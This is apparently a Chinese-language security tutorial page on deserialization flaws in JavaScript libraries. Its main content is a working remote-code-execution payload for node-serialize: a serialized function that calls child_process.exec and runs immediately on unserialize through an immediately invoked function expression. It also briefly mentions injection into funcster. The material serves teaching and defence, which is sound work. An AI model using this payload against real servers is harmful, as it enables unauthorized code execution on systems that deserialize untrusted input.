反序列化
========================================

简介
----------------------------------------
JavaScript本身并没有反序列化的实现，但是一些库如node-serialize、serialize-to-js等支持了反序列化功能。这些库通常使用JSON形式来存储数据，但是和原生函数JSON.parse、 JSON.stringify不同，这些库支持任何对象的反序列化，特别是函数，如果使用不当，则可能会出现反序列化问题。

Payload构造
----------------------------------------
下面是一个最简单的例子，首先获得序列化后的输出

.. code-block:: javascript

    var y = {
     rce : function(){
     require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
     },
    }
    var serialize = require('node-serialize');
    console.log("Serialized: \n" + serialize.serialize(y));

上面执行后会返回

.. code-block:: javascript

    {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}"}

不过这段payload反序列化后并不会执行，但是在JS中支持立即调用的函数表达式（Immediately Invoked Function Expression），比如 ``(function () { /* code */ } ());`` 这样就会执行函数中的代码。那么可以使用这种方法修改序列化后的字符串来完成一次反序列化。最后的payload测试如下:


.. code-block:: javascript

    var serialize = require('node-serialize');
    var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
    serialize.unserialize(payload);


Payload构造 II
----------------------------------------
以上提到的是node-serialize这类反序列化库的构造方式，还有一类库如funcster，是使用直接拼接字符串构造函数的方式来执行。

.. code-block:: javascript

    return "module.exports=(function(module,exports){return{" + entries + "};})();";

这种方式可以使用相应的闭合来构造payload。
